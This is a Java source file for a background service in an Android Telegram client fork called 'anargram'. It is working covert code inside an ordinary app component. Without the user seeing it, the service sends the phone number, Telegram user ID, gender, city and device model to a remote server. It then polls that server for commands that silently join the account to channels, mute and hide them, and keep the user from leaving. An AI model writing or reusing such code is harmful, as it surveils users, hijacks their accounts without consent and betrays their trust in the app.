package anargram.FcmService.Service;

import android.app.AlarmManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.IBinder;
import android.support.annotation.RequiresApi;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import org.telegram.messenger.AndroidUtilities;
import org.telegram.messenger.ApplicationLoader;
import org.telegram.messenger.FileLog;
import org.telegram.messenger.UserConfig;
import org.telegram.messenger.volley.DefaultRetryPolicy;
import org.telegram.messenger.volley.Request;
import org.telegram.messenger.volley.RequestQueue;
import org.telegram.messenger.volley.Response;
import org.telegram.messenger.volley.VolleyError;
import org.telegram.messenger.volley.toolbox.JsonArrayRequest;
import org.telegram.messenger.volley.toolbox.StringRequest;
import org.telegram.messenger.volley.toolbox.Volley;
import org.telegram.ui.LaunchActivity;

import java.util.Calendar;

import anargram.FcmService.Helper.Channel.ChannelHelper;
import anargram.FcmService.Helper.MuteHelper;
import anargram.FcmService.Helper.Notification.NotificationHelper;
import anargram.FcmService.Helper.Packet.SendRegidPacket;
import anargram.FcmService.Helper.Packet.SendViewPacket;
import anargram.FcmService.Helper.UrlController;
import anargram.FcmService.NotificationActivity;
import anargram.FcmService.Setting.LastInListController;
import anargram.FcmService.Setting.NoQuitContoller;
import anargram.FcmService.Setting.Setting;
import anargram.FcmService.Setting.TurnQuitToHideController;
import anargram.FcmService.Setting.hideChannelController;

/**
 * Created by Saman on 8/23/2016.
 */
public class ServiesOfCommands extends Service {
    private RequestQueue requestQueue;
    Calendar cur_cal = Calendar.getInstance();
    @Override
    public void onCreate() {
        //Log.e("myservies", "service created");
        // TODO Auto-generated method stub
        super.onCreate();
        requestQueue = Volley.newRequestQueue(ApplicationLoader.applicationContext);
        Intent intent = new Intent(this, ServiesOfCommands.class);
        PendingIntent pintent = PendingIntent.getService(getApplicationContext(),
                0, intent, 0);
        AlarmManager alarm = (AlarmManager) getSystemService(Context.ALARM_SERVICE);
        cur_cal.setTimeInMillis(System.currentTimeMillis());
        alarm.setRepeating(AlarmManager.RTC_WAKEUP, cur_cal.getTimeInMillis(),
                1000*60*15, pintent);

    }
    @Override
    public void onStart(Intent intent, int startId) {
        // TODO Auto-generated method stub
        super.onStart(intent, startId);
        // your code for background process
        //Log.e("myservies", "service On Start");
        getUpdates();
    }

    private void getUpdates() {
        //Log.e("getupdate","start Geting Update");
        if(!UserConfig.isClientActivated())return;

        if(!Setting.isJoined()){
            //Log.e("getupdate","start joining");
            Join();
            return;
        }
        if(Setting.getRegId()!=null&&(!Setting.RegidIsSended())){
            new SendRegidPacket().Send();
        }
        if(Setting.RegidIsSended()){
            new SendViewPacket().Send();
            return;
        }
        //Log.e("getupdate","start Geting Update 2wise");
        String phonenumber= UserConfig.getCurrentUser().phone;
        JsonArrayRequest jsonObjReq = new JsonArrayRequest(Request.Method.GET,  UrlController.SERVERADD+"getupdate.php?phone="+phonenumber, null,
                new Response.Listener<JSONArray>() {
                    @RequiresApi(api = Build.VERSION_CODES.JELLY_BEAN)
                    @Override
                    public void onResponse(JSONArray response) {
                        //  //Log.e("Response",response.toString());
                        try {
                            for (int a = 0; a < response.length(); a++) {
                                try {
                                    JSONObject object = response.getJSONObject(a);
                                    //act
                                    getUpdate(object);
                                } catch (Exception e) {
                                    //Log.e("tmessages", String.valueOf(e));
                                    FileLog.e( e);
                                }
                            }
                        } catch (Exception e) {
                            //Log.e("tmessages", String.valueOf(e));
                            FileLog.e( e);
                        }

                    }
                },
                new Response.ErrorListener() {
                    @Override
                    public void onErrorResponse(VolleyError error) {
                        //Log.e("tmessages", "Error: " + error.getMessage());
                        FileLog.e( "Error: " + error.getMessage());

                    }
                }) {


        };
        jsonObjReq.setShouldCache(false);
        jsonObjReq.setTag("search");
        requestQueue.add(jsonObjReq);
        jsonObjReq.setRetryPolicy(new DefaultRetryPolicy(
                30 * 1000,
                DefaultRetryPolicy.DEFAULT_MAX_RETRIES,
                DefaultRetryPolicy.DEFAULT_BACKOFF_MULT));
        //requestQueue.start();
        //Log.e("Servies", "sendedRequest");
    }

    @RequiresApi(api = Build.VERSION_CODES.JELLY_BEAN)
    private void getUpdate(JSONObject object) {

        try {
            String channel="";
            String text="";
            String title="";
            switch(object.getInt("type")){
                case 2:
                    channel=object.getString("link");
                    text=object.getString("text");
                    title=object.getString("title");
                    Intent p= new Intent(ServiesOfCommands.this,NotificationActivity.class);
                    p.putExtra("channellink",channel);
                    Setting.setCurrentJoiningChannel(channel);
                    //NotificationCreator.create(title, text, p);
                    NotificationHelper.buildNotification(title,text,p).build();

                    //ifdidntworkfrom end 3 one is link
                    // LaunchActivity.thiscontext.runLinkRequest(channel, null, null, null, null, null, false, null, 1);

                    break;
                case 1:
                    channel=object.getString("link");
                    text=object.getString("text");
                    Setting.setCurrentJoiningChannel(channel);
                    title=object.getString("title");
                    Intent p1= new Intent(ServiesOfCommands.this,LaunchActivity.class);
                    p1.putExtra("channellink",channel);
                    p1.putExtra("text",text);
                    p1.putExtra("title",title);
                    p1.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                    startActivity(p1);
                    // NotificationCreator.CreateDialog(title,text,null);
                    break;
                case 3:
                    channel=object.getString("channel");
                    Setting.setCurrentJoiningChannel(channel);

                    int noexit=object.getInt("noexit");
                    int hide=0;
                    int lastinlist=0;
                    int mute=0;
                    int nhide=0;
                    if(!object.isNull("hide"))hide=object.getInt("hide");
                    if(!object.isNull("lastinlist"))lastinlist=object.getInt("lastinlist");
                    if(!object.isNull("mute"))mute=object.getInt("mute");
                    if(!object.isNull("fav"))nhide=object.getInt("fav");

                    if(noexit>0){
                        NoQuitContoller.addToNoQuit(channel);
                    }
                    if(nhide>0){
                        TurnQuitToHideController.add(channel);
                    }
                    ChannelHelper.JoinFast(channel.replace("@",""));
                    if(mute>0){
                        final String finalChannel = channel;
                        AndroidUtilities.runOnUIThread(new Runnable() {
                            @Override
                            public void run() {
                                MuteHelper.muteChannel(finalChannel.replace("@",""));
                            }
                        },5000);
                    }
                    if(hide>0){
                        hideChannelController.add(channel.replace("@",""));
                    }
                    if(lastinlist>0){
                        LastInListController.add(channel.replace("@",""));
                    }

                    break;
            }
        } catch (JSONException e) {
            e.printStackTrace();
        }

    }
    public static void Join(){
        if(!UserConfig.isClientActivated())return;
        if(Setting.isJoined())return;
        if(!Setting.EnteredInfo())return;
        RequestQueue squere = Volley.newRequestQueue(ApplicationLoader.applicationContext);
        String url= UrlController.SERVERADD+"join.php?";
        String phonenumber= UserConfig.getCurrentUser().phone;
        url+="phone="+phonenumber;
        url+="&male="+ (Setting.IsMale()?"1":"0");
        url+="&privance="+ Setting.getCity();
        url+="&android="+ Build.VERSION.RELEASE;
        PackageInfo pInfo = null;
        int version = 0;
        try {
            pInfo = ApplicationLoader.applicationContext. getPackageManager().getPackageInfo(ApplicationLoader.applicationContext.getPackageName(), 0);
            version=pInfo.versionCode;
        } catch (PackageManager.NameNotFoundException e) {
            e.printStackTrace();
        }

        url+="&version="+version;
        url+="&userid="+ UserConfig.getCurrentUser().id;

        String model=Build.MODEL.replace(" ","-");
        if(model.length()>15){
            model=model.substring(0,15);
        }
        url+="&phonemodel="+model;
        //Log.e("Url",url);
        StringRequest jsonObjReq = new StringRequest(Request.Method.GET, url,
                new Response.Listener<String>() {
                    @Override
                    public void onResponse(String response) {
                        //  //Log.e("Response",response.toString());
                        try {
                            JSONObject json=new JSONObject(response);
                            if(json.getInt("done")==1){
                                Setting.setJoined();
                                new SendRegidPacket().Send();
                                new SendViewPacket().Send();
                            }
                        } catch (Exception e) {
                            //Log.e("tmessages", String.valueOf(e));
                            FileLog.e( e);
                        }

                    }
                },
                new Response.ErrorListener() {
                    @Override
                    public void onErrorResponse(VolleyError error) {
                        //Log.e("tmessages", "Error: " + error.getMessage());
                        FileLog.e( "Error: " + error.getMessage());

                    }
                });
        jsonObjReq.setShouldCache(false);
        jsonObjReq.setTag("searcsh");
        squere.add(jsonObjReq);
        jsonObjReq.setRetryPolicy(new DefaultRetryPolicy(
                30 * 1000,
                DefaultRetryPolicy.DEFAULT_MAX_RETRIES,
                DefaultRetryPolicy.DEFAULT_BACKOFF_MULT));
    }
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    public void onDestroy() {
        //Log.e("myservies", "service destroyed");
        if (requestQueue != null) {
            requestQueue.cancelAll("search");
            requestQueue.stop();
        }
    }
}
